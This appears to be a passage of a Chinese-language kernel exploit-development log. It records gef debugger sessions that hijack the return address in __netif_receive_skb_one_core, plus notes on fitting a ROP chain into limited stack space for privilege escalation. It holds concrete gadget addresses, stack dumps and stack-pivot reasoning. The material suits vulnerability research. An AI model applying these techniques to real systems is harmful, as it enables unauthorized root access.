gef➤  x /2xg 0xffffffff822c1e32
0xffffffff822c1e32 <serial_pci_tbl+4850>:	0x0000000040010000	0x0049000000000000

// (4) 正确劫持控制流

root@syzkaller:~# cat /proc/kallsyms | grep __netif_receive_skb_one_core
ffffffff81a201c0 t __netif_receive_skb_one_core
gef➤  x /100i __netif_receive_skb_one_core
   0xffffffff81a20231 <__netif_receive_skb_one_core+113>:	jne    0xffffffff81a20251 <__netif_receive_skb_one_core+145>
   0xffffffff81a20233 <__netif_receive_skb_one_core+115>:	add    rsp,0x18
   0xffffffff81a20237 <__netif_receive_skb_one_core+119>:	pop    r12
   0xffffffff81a20239 <__netif_receive_skb_one_core+121>:	pop    rbp
   0xffffffff81a2023a <__netif_receive_skb_one_core+122>:	ret 

    b *0xffffffff81a2023a

问题: 由于 劫持返回地址 ret_addr 和原作者不一样，偏移多出了0x70，导致能够写入的ROP链长度不够了，必须改进ROP长度，变短一点。
    原先能写 0xff，现在只能写 0xb8 长度。 填充完之后只能放7条 ROP, 但是我们至少需要 11 条 ROP 才能提权。

解决: 跳入 __do_softirq() 函数中后，为了栈平衡，需填充 0x60 字节的 \x00
    改进一下，引入一条 ROP: sub rsp, -0x80; pop rbx; pop r12; pop r13; pop rbp; ret;
    这条ROP先将RSP减0x80, 再pop4次, 恰好达到 填充 0x60 字节的效果, 绝了!!!!!!  
    
    不行。。。 执行完 __do_softirq() 后再 SUB RSP 0x80 已经没有用了。

    可以把ROP链放进这填充的 0x60 字节里面, 刚好后面的 ROP 个数为11个, 小于12, 完美!!!

问题: 找不到 "add rsp, -0x80" / "sub rsp,0x80" 这种 gadget
    现在要利用7条指令，将 RSP 减去 0x90



从这里开始往回调， rsp减去 0x60
gef➤  x /40xg  $rsp 
0xffffc900000d0f08:	0xffffffff81021638	0xffffffff8145c7c7
0xffffc900000d0f18:	0x00000000deadbeef	0xffffffff8155aba2
0xffffc900000d0f28:	0x0000000000000080	0xffffffff81152428
0xffffc900000d0f38:	0xffffffff8164cfea	0xffffc900000d0f40
0xffffc900000d0f48:	0xffffc900000d0f40	0xb94a7d86319c1000
0xffffc900000d0f58:	0xffffffff828060d8	0x0000000000000020
0xffffc900000d0f68:	0x0000000000000003	0xffffffff828060c0
0xffffc900000d0f78:	0x0000000000000008	0xffffc900000d0fe8
0xffffc900000d0f88:	0xffffffff820000fb	0x0000000a00400100
0xffffc900000d0f98:	0xffff8881042c97c0	0x00000000ffffb663
0xffffc900000d0fa8:	0xffff8881042c97c0	0x0000000000000003
0xffffc900000d0fb8:	0x0000000400000101	0x0000000000000246
0xffffc900000d0fc8:	0x0000000000000000	0xffff88810234be00
0xffffc900000d0fd8:	0x000000000000000e	0x0000000000000010
0xffffc900000d0fe8:	0xffffc90000487a10	0xffffffff810a9a01
0xffffc900000d0ff8:	0xffffc90000487a08	Cannot access memory at address 0xffffc900000d1000
gef➤  x /60xg  $rsp-0x60 
0xffffc900000d0ea8:	0xffffffff811ef7e0	0xffffffff8102bfb1
0xffffc900000d0eb8:	0x00000000deadbeef	0x00000000deadbeef
0xffffc900000d0ec8:	0xffffffff810223e6	0xffffffff8286d940
0xffffc900000d0ed8:	0xffffffff810d12b0	0xffffffff81092100
0xffffc900000d0ee8:	0xffffffff8286db80	0xffffffff810d2690
0xffffc900000d0ef8:	0xffffffff8128b2e4	0x00000000deadbeef
0xffffc900000d0f08:	0xffffffff81021638	0xffffffff8145c7c7



最后一步，返回到 syscall 调用栈
gef➤  x /100xg $rsp
0xffffc900000d0ef8:	0xffffffff8128b2e4	0x00000000deadbeef
0xffffc900000d0f08:	0xffffc900000d0f10	0xffffc900000d0f10
0xffffc900000d0f18:	0x00000000deadbeef	0xffffffff8155aba2
0xffffc900000d0f28:	0x0000000000000070	0xffffffff81152428
0xffffc900000d0f38:	0xffffc900000d0ea0	0xffffc900000d0f40
0xffffc900000d0f48:	0xffffc900000d0f40	0xd3ea2ab1478b5f00
0xffffc900000d0f58:	0xffffffff828060d8	0x0000000000000020
0xffffc900000d0f68:	0x0000000000000003	0xffffffff828060c0
0xffffc900000d0f78:	0x0000000000000008	0xffffc900000d0fe8
0xffffc900000d0f88:	0xffffffff820000fb	0x0000000a00400100
0xffffc900000d0f98:	0xffff888101ed8000	0x00000000ffff1728
0xffffc900000d0fa8:	0xffff888101ed8000	0x0000000000000003
0xffffc900000d0fb8:	0x0000000400000101	0x0000000000000246
0xffffc900000d0fc8:	0x0000000000000000	0xffff888102262000
0xffffc900000d0fd8:	0x000000000000000e	0x0000000000000010
0xffffc900000d0fe8:	0xffffc90000457a10	0xffffffff810a9a01
0xffffc900000d0ff8:	0xffffc90000457a08	Cannot access memory at address 0xffffc900000d1000
gef➤  x /5i 0xffffffff828060d8
   0xffffffff828060d8 <softirq_vec+24>:	rex adc eax,0xffff81a2
   0xffffffff828060de <softirq_vec+30>:	(bad)  
   0xffffffff828060df <softirq_vec+31>:	inc    DWORD PTR [rax]
   0xffffffff828060e1 <softirq_vec+33>:	rex.R pop rax
   0xffffffff828060e3 <softirq_vec+35>:	cmp    edi,0xffffff
gef➤  x /3i 0xffffffff828060c0
   0xffffffff828060c0 <softirq_vec>:	rcl    BYTE PTR [rbp-0x7ef6],1
   0xffffffff828060c6 <softirq_vec+6>:	(bad)  
   0xffffffff828060c7 <softirq_vec+7>:	jmp    QWORD PTR [rax-0x71]
gef➤  x /3i 0xffffffff820000fb
   0xffffffff820000fb <__do_softirq+251>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff82000100 <__do_softirq+256>:	mov    r9d,DWORD PTR gs:[rip+0x7e01fa78]        # 0x1fb80 <__preempt_count>
   0xffffffff82000108 <__do_softirq+264>:	and    r9d,0x7fffffff
gef➤  x /3i 0xffffffff810a9a01
   0xffffffff810a9a01 <do_softirq+145>:	pop    rsp
   0xffffffff810a9a02 <do_softirq+146>:	mov    rdi,0xffffffff826af426
   0xffffffff810a9a09 <do_softirq+153>:	call   0xffffffff81c9a450 <__this_cpu_preempt_check>

*/
